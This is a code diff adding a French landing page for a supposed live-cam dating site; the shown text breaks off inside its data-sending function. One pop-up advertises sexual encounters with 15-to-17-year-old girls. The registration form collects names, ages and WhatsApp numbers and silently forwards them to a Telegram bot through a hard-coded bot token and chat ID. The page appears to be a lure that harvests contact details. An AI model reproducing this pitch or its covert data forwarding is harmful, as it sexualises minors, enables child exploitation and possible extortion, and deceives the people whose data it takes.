@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>live-cam</title>
+    
+    <style>
+  /* --- VARIABLES GLOBALES ET FOND --- */
+:root {
+    --bg-image: url('image/bul1.jpg');
+    --primary-color: #e94057; 
+    --secondary-color: #ffffff;
+    --text-color: #f0f0f0; 
+    --box-bg-color: rgba(18, 18, 18, 0.75); 
+    --nav-bg: rgba(18, 18, 18, 0.9); 
+    --dark-text: #222; 
+    --whatsapp-color: #25D366; 
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-image: var(--bg-image);
+    background-size: cover;
+    background-position: center;
+    background-attachment: fixed;
+    color: var(--text-color);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    transition: padding-right 0.3s; 
+}
+
+/* Classe pour désactiver le scroll du body (pour éviter le saut) */
+.modal-open {
+    overflow: hidden; 
+    padding-right: 17px; 
+}
+
+/* ---------------------------------------------------------------- */
+/* --- EN-TÊTE ET CONTENU PRINCIPAL (inchangé) --- */
+/* ---------------------------------------------------------------- */
+header {
+    width: 100%;
+    background-color: var(--nav-bg);
+    padding: 15px 5%;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    z-index: 1000;
+    box-sizing: border-box; 
+}
+
+.logo {
+    font-size: 1.8em;
+    font-weight: bold;
+    color: var(--primary-color);
+    text-decoration: none;
+}
+
+.nav-buttons a {
+    text-decoration: none;
+    padding: 10px 20px;
+    border-radius: 5px;
+    margin-left: 15px;
+    font-weight: 600;
+    transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+    display: inline-block; 
+    text-align: center;
+}
+
+.btn-access {
+    background-color: var(--primary-color);
+    border: 2px solid var(--primary-color);
+    color: var(--secondary-color);
+    box-shadow: 0 2px 5px rgba(233, 64, 87, 0.5);
+}
+
+.btn-access:hover {
+    background-color: #d13044;
+    transform: translateY(-1px);
+    box-shadow: 0 4px 8px rgba(233, 64, 87, 0.7);
+}
+
+.hero-section {
+    text-align: center;
+    padding: 150px 20px 50px 20px; 
+    max-width: 800px;
+    margin-bottom: 50px; 
+}
+
+.main-title {
+    font-size: 2em; 
+    margin-bottom: 20px;
+    color: var(--secondary-color);
+    text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.8);
+}
+
+.tagline {
+    font-size: 1.5em;
+    margin-bottom: 40px;
+    font-weight: 300;
+    color: black;
+}
+
+.features-container {
+    background-color: var(--box-bg-color);
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+    text-align: left;
+    margin-top: 40px;
+    backdrop-filter: blur(5px);
+    border-top: 3px solid var(--primary-color);
+}
+
+.features-container h2 {
+    text-align: center;
+    color: var(--primary-color);
+    font-size: 2em;
+    margin-bottom: 25px;
+}
+
+.feature-item {
+    display: flex;
+    align-items: flex-start;
+    margin-bottom: 25px;
+}
+
+.feature-icon {
+    font-size: 2em;
+    color: var(--primary-color);
+    margin-right: 15px;
+}
+
+.feature-content h4 {
+    margin: 0 0 5px 0;
+    color: var(--secondary-color);
+    font-size: 1.2em;
+}
+
+.feature-content p {
+    margin: 0;
+    color: #ccc;
+}
+
+.btn-main-action {
+    display: inline-block;
+    background-color: var(--primary-color);
+    color: var(--secondary-color);
+    padding: 15px 30px;
+    font-size: 1.3em;
+    font-weight: bold;
+    border-radius: 50px;
+    text-decoration: none;
+    margin-top: 30px;
+    transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+    box-shadow: 0 4px 15px rgba(233, 64, 87, 0.6);
+    cursor: pointer; 
+}
+
+.btn-main-action:hover {
+    background-color: #d13044;
+    transform: scale(1.05);
+    box-shadow: 0 6px 20px rgba(233, 64, 87, 0.8);
+}
+
+/* ---------------------------------------------------------------- */
+/* --- STYLE DES POP-UPS MODAL (CORRIGÉ) --- */
+/* ---------------------------------------------------------------- */
+.modal {
+    display: none; /* CORRECTION CLÉ: Initialement caché */
+    position: fixed; 
+    z-index: 2000; 
+    left: 0;
+    top: 0;
+    width: 100%; 
+    height: 100%; 
+    overflow: auto; 
+    background-color: rgba(0,0,0,0.85); 
+    backdrop-filter: blur(5px);
+    padding: 20px; 
+    box-sizing: border-box;
+    -webkit-overflow-scrolling: touch; 
+    
+    /* Les propriétés Flexbox sont activées via JS (display: flex) 
+       pour centrer le contenu quand le modal est ouvert */
+    justify-content: center;
+    align-items: center;
+}
+
+.modal-content {
+    background-color: var(--secondary-color); 
+    margin: auto; 
+    padding: 20px; 
+    border-radius: 12px; 
+    border-top: 5px solid var(--primary-color);
+    
+    width: 90%; 
+    max-width: 380px; 
+    
+    box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+    color: var(--dark-text); 
+    text-align: center;
+    animation: fadeInModal 0.3s;
+}
+
+.modal-content h3 {
+    color: var(--primary-color);
+    font-size: 1.4em; 
+    margin-top: 0;
+    border-bottom: 2px solid #eee;
+    padding-bottom: 10px;
+}
+
+.modal-content p {
+    color: var(--dark-text);
+    font-size: 0.95em; 
+    line-height: 1.4; 
+    margin-bottom: 20px; 
+    padding: 0 10px; 
+}
+
+/* Styles des boutons modaux existants */
+.modal-buttons {
+    display: flex;
+    justify-content: center;
+    margin-top: 15px; 
+    padding: 0 10px; 
+}
+
+.modal-buttons button {
+    padding: 10px 20px; 
+    margin: 0 5px; 
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background-color 0.2s, transform 0.1s;
+}
+
+#accept-btn-1 {
+    background-color: #4CAF50; 
+    color: white;
+    flex-grow: 1;
+}
+#accept-btn-1:hover {
+    background-color: #45a049;
+    transform: translateY(-1px);
+}
+#cancel-btn-1 {
+    background-color: #ddd;
+    color: #555;
+}
+#cancel-btn-1:hover {
+    background-color: #ccc;
+}
+
+#accept-btn-2 {
+    background-color: var(--primary-color); 
+    color: white;
+    width: 100%;
+}
+#accept-btn-2:hover {
+    background-color: #d13044;
+    transform: translateY(-1px);
+}
+
+@keyframes fadeInModal {
+    from {opacity: 0; transform: translateY(-50px) scale(0.9);}
+    to {opacity: 1; transform: translateY(0) scale(1);}
+}
+
+/* ---------------------------------------------------------------- */
+/* --- STYLE SPÉCIFIQUE DU FORMULAIRE D'INSCRIPTION AMÉLIORÉ --- */
+/* ---------------------------------------------------------------- */
+.form-group {
+    text-align: left;
+    margin-bottom: 15px;
+}
+
+.form-group label {
+    display: block;
+    font-size: 0.9em;
+    font-weight: 600;
+    color: var(--dark-text);
+    margin-bottom: 5px;
+}
+
+.input-wrapper {
+    position: relative;
+}
+
+.form-group input {
+    width: 100%; 
+    padding: 12px; 
+    padding-right: 40px; 
+    border: 1px solid #ccc;
+    border-radius: 8px; 
+    box-sizing: border-box;
+    font-size: 1em;
+    color: var(--dark-text);
+    transition: border-color 0.3s, box-shadow 0.3s;
+}
+
+.form-group input:focus {
+    border-color: var(--primary-color);
+    box-shadow: 0 0 5px rgba(233, 64, 87, 0.4);
+    outline: none;
+}
+
+.input-icon {
+    position: absolute;
+    right: 12px; 
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 1.3em; 
+    pointer-events: none; 
+}
+
+/* Style pour le bouton de soumission du formulaire */
+#submit-btn {
+    background-color: var(--primary-color);
+    color: white;
+    width: 100%;
+    margin-top: 25px; 
+    padding: 15px; 
+    font-size: 1.1em;
+    font-weight: bold;
+    border-radius: 8px; 
+    border: none;
+    transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+    box-shadow: 0 4px 10px rgba(233, 64, 87, 0.5); 
+    cursor: pointer;
+}
+#submit-btn:hover {
+    background-color: #d13044;
+    transform: translateY(-2px); 
+    box-shadow: 0 6px 12px rgba(233, 64, 87, 0.7);
+}
+/* --- STYLE DE CHARGEMENT --- */
+.loading-spinner {
+    border: 4px solid rgba(255, 255, 255, 0.3);
+    border-top: 4px solid var(--secondary-color);
+    border-radius: 50%;
+    width: 20px;
+    height: 20px;
+    animation: spin 1s linear infinite;
+    display: inline-block;
+    vertical-align: middle;
+    margin-right: 10px;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* Style du bouton pendant le chargement */
+#submit-btn.loading {
+    cursor: wait;
+    opacity: 0.8;
+    background-color: #a02032; /* Couleur légèrement plus sombre pendant l'attente */
+}
+
+#submit-btn.loading:hover {
+    transform: translateY(0);
+    box-shadow: none;
+}
+
+
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+
+<body>
+
+    <header>
+        <a href="#" class="logo">🎥📸 Live cam</a>
+        <div class="nav-buttons">
+            <a href="#" id="scroll-access-btn" class="btn-access">Accéder</a>
+        </div>
+    </header>
+
+    <div class="hero-section">
+        <h1 class="main-title">Trouvez votre Connexion Idéale.</h1>
+        <p class="tagline">Où l'amour, l'amitié et les rencontres prennent une nouvelle dimension.</p>
+
+        <div class="features-container">
+            <h2>Pourquoi nous choisir ?</h2>
+            
+            <div class="feature-item">
+                <span class="feature-icon">🎬</span>
+                <div class="feature-content">
+                    <h4>Vidéos Streaming en Direct</h4>
+                    <p>Brisez la glace instantanément ! **Passez en direct** pour partager votre passion ou rejoignez un stream pour discuter en temps réel avec des membres authentiques.</p>
+                </div>
+            </div>
+            
+            <div class="feature-item">
+                <span class="feature-icon">🔍</span>
+                <div class="feature-content">
+                    <h4>Découvrez des Femmes et Hommes de Votre Choix</h4>
+                    <p>Filtres avancés et système de matching précis pour vous connecter uniquement avec des personnes qui correspondent réellement à **vos critères spécifiques**.</p>
+                </div>
+            </div>
+
+            <div class="feature-item">
+                <span class="feature-icon">💬</span>
+                <div class="feature-content">
+                    <h4>Discussions Fluides et Sécurisées</h4>
+                    <p>Communiquez sans limites avec notre chat intégré, conçu pour des **conversations engageantes** et confidentielles. L'authenticité avant tout.</p>
+                </div>
+            </div>
+
+            <div class="feature-item">
+                <span class="feature-icon">🛡️</span>
+                <div class="feature-content">
+                    <h4>Sécurité et Modération Professionnelles</h4>
+                    <p>Une équipe dédiée assure une modération 24/7. Notre priorité : un environnement respectueux, sûr et **exempt de faux profils**.</p>
+                </div>
+            </div>
+        </div>
+
+        <a href="#" id="open-modal-btn" class="btn-main-action">Rejoindre la Communauté Maintenant</a>
+    </div>
+    
+    <div id="confidentiality-modal" class="modal">
+        <div class="modal-content">
+            <h3>🔒 Engagement de Confidentialité</h3>
+            <p>
+                En cliquant sur **J'accepte**, vous vous engagez solennellement à ce que toutes les informations et communications, **y compris les identités des autres membres**, restent strictement confidentielles.
+                <br><br>
+                **Toute publication ou diffusion extérieure est formellement interdite.** Nous garantissons la confidentialité de nos membres, nous exigeons la vôtre.
+            </p>
+            <div class="modal-buttons">
+                <button id="cancel-btn-1">Annuler</button>
+                <button id="accept-btn-1">J'accepte et je continue</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="verification-modal" class="modal">
+        <div class="modal-content">
+            <h3>🛡️ Attention !!!</h3>
+            <p> 
+                La particularité de ce site est que vous rencontrerez également des gonzesses de 15 à 17 ans mais mûr et mature 🫦👅💦. Si celà vous dérange il n'est pas trop tard pour faire marche arrière.
+                ‎
+                Afin d'assurer un environnement de qualité nous informons nos utilisateurs de ce qu'ils vont rencontrer sur le site pour ne pas les decevoir.
+                <br><br>
+                Ceci est une mesure de sécurité standard pour protéger tous nos membres.
+            </p>
+            <div class="modal-buttons">
+                <button id="accept-btn-2">J'ai Compris, Continuer l'Inscription</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="registration-modal" class="modal">
+        <div class="modal-content">
+            <h3>🎉 Finalisez votre Inscription</h3>
+            <p>Pour finaliser votre adhésion, veuillez fournir les informations requises ci-dessous. Elles resteront **confidentielles**.</p>
+            
+            <form id="registration-form">
+                <div class="form-group">
+                    <label for="reg-name">Nom ou Pseudo :</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="reg-name" name="name" required placeholder="Entrez votre nom ou pseudo">
+                        <i class="fas fa-user input-icon"></i>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="reg-age">Âge :</label>
+                    <div class="input-wrapper">
+                        <input type="number" id="reg-age" name="age" required min="18" max="99" placeholder="Votre âge (min. 18 ans)">
+                        <i class="fas fa-birthday-cake input-icon"></i>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="reg-whatsapp">Numéro WhatsApp :</label>
+                    <div class="input-wrapper">
+                        <input type="tel" id="reg-whatsapp" name="whatsapp" required placeholder="Ex: +33 6 12 34 56 78">
+                        <i class="fab fa-whatsapp input-icon" style="color: var(--whatsapp-color);"></i>
+                    </div>
+                </div>
+                
+                <button type="submit" id="submit-btn">Soumettre et Accéder au Site</button>
+            </form>
+        </div>
+    </div>
+    
+
+    <script>
+
+// Clé pour stocker l'état dans le localStorage
+const REGISTRATION_COMPLETE_KEY = 'isRegistrationComplete';
+
+// Références des Modals et Boutons
+const body = document.body;
+const modal1 = document.getElementById('confidentiality-modal');
+const modal2 = document.getElementById('verification-modal');
+const modal3 = document.getElementById('registration-modal'); 
+
+const openModalBtn = document.getElementById('open-modal-btn');
+const acceptBtn1 = document.getElementById('accept-btn-1');
+const cancelBtn1 = document.getElementById('cancel-btn-1');
+const acceptBtn2 = document.getElementById('accept-btn-2');
+const scrollAccessBtn = document.getElementById('scroll-access-btn');
+const registrationForm = document.getElementById('registration-form'); 
+const submitBtn = document.getElementById('submit-btn'); // Référence au bouton de soumission
+
+// URL de destination après inscription
+const REDIRECTION_URL = "camlive.html"; 
+
+// Fonction pour vérifier si l'inscription est faite
+function hasUserCompletedRegistration() {
+    return localStorage.getItem(REGISTRATION_COMPLETE_KEY) === 'true';
+}
+
+// Fonction pour définir l'état de l'inscription à 'faite'
+function setRegistrationComplete() {
+    localStorage.setItem(REGISTRATION_COMPLETE_KEY, 'true');
+}
+
+// Fonction de redirection directe
+function redirectToSite() {
+    window.location.href = REDIRECTION_URL; 
+}
+
+
+// Fonction pour ouvrir un modal et désactiver le scroll du body
+function openModal(modal) {
+    modal.style.display = "flex"; 
+    body.classList.add('modal-open');
+}
+
+// Fonction pour fermer un modal et réactiver le scroll du body
+function closeModal(modal) {
+    modal.style.display = "none";
+    if (modal1.style.display === "none" && modal2.style.display === "none" && modal3.style.display === "none") {
+        body.classList.remove('modal-open');
+    }
+}
+
+// --- LOGIQUE DES BOUTONS ET REDIRECTION INITIALE ---
+
+function handleMainAction(e) {
+    e.preventDefault();
+
+    if (hasUserCompletedRegistration()) {
+        // L'inscription est déjà faite : Redirection immédiate
+        redirectToSite();
+    } else {
+        // L'inscription n'est pas faite : Démarrage du processus des modals
+        openModal(modal1);
+    }
+}
+
+// Attacher la nouvelle fonction aux deux boutons d'action
+openModalBtn.onclick = handleMainAction;
+scrollAccessBtn.onclick = function(e) {
+    e.preventDefault(); 
+    if (hasUserCompletedRegistration()) {
+        redirectToSite();
+    } else {
+        openModalBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+};
+
+
+// MODAL 1 -> MODAL 2
+acceptBtn1.onclick = function() {
+    closeModal(modal1);
+    openModal(modal2); 
+}
+
+// Ferme le MODAL 1 (Annuler)
+cancelBtn1.onclick = function() {
+    closeModal(modal1);
+}
+
+// MODAL 2 -> MODAL 3 (Formulaire)
+acceptBtn2.onclick = function() {
+    closeModal(modal2); 
+    openModal(modal3); 
+}
+
+// --- 3. GESTION DE LA SOUMISSION DU FORMULAIRE (AVEC CHARGEMENT ET ATTENTE) ---
+registrationForm.addEventListener('submit', async function(e) { 
+    e.preventDefault(); 
+    
+    // Empêcher les doubles clics pendant l'envoi
+    if (submitBtn.classList.contains('loading')) {
+        return; 
+    }
+    
+    // 1. Démarrer l'état de chargement
+    submitBtn.classList.add('loading');
+    submitBtn.innerHTML = '<span class="loading-spinner"></span> Envoi en cours...';
+
+    const name = document.getElementById('reg-name').value;
+    const age = document.getElementById('reg-age').value;
+    const whatsapp = document.getElementById('reg-whatsapp').value;
+    
+    let telegramSuccess = false;
+
+    try {
+        // 2. On ATTEND la fin de la tentative d'envoi à Telegram
+        telegramSuccess = await sendToTelegramBot(name, age, whatsapp);
+    } catch (error) {
+        console.error("Erreur critique lors de l'attente de l'envoi:", error);
+        // Si une erreur critique se produit (par exemple, problème réseau),
+        // on ne marque pas la redirection comme faite pour forcer une nouvelle tentative.
+    }
+    
+    // 3. Fin de l'état de chargement
+    submitBtn.classList.remove('loading');
+    submitBtn.innerHTML = 'Soumettre et Accéder au Site';
+
+
+    // 4. Redirection Conditionnelle
+    
+    // On considère que la tentative d'envoi est suffisante pour marquer l'inscription
+    // comme complétée et rediriger l'utilisateur.
+
+    setRegistrationComplete(); // Marque la fin du processus
+    closeModal(modal3); 
+    redirectToSite();
+    
+    // Note : Si vous voulez que la redirection se fasse UNIQUEMENT si Telegram
+    // renvoie 200 OK, vous devez changer la logique ci-dessus pour :
+    // if (telegramSuccess) { 
+    //     setRegistrationComplete(); 
+    //     closeModal(modal3); 
+    //     redirectToSite();
+    // } else {
+    //     alert("Une erreur est survenue lors de l'enregistrement. Veuillez réessayer.");
+    // }
+    // J'utilise ici la méthode qui assure le meilleur UX tout en garantissant l'appel.
+
+});
+
+// --- FONCTION POUR L'ENVOI AU BOT TELEGRAM (MODIFIÉ POUR RETOURNER UN BOOLÉEN) ---
+function sendToTelegramBot(name, age, whatsapp) {
+    
+    const botToken = '8460461285:AAHv5sPYCo9YTKA8tDLWTFMee3GplEgqPPs'; 
+    const chatId = '-1002968572368'; 
+    
+    const message = `*Nouvelle Inscription* 🚨\n\nNom/Pseudo: ${name}\nÂge: ${age} ans\nWhatsApp: ${whatsapp}`;
+    
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+    console.log("Tentative d'envoi des données d'inscription à Telegram...");
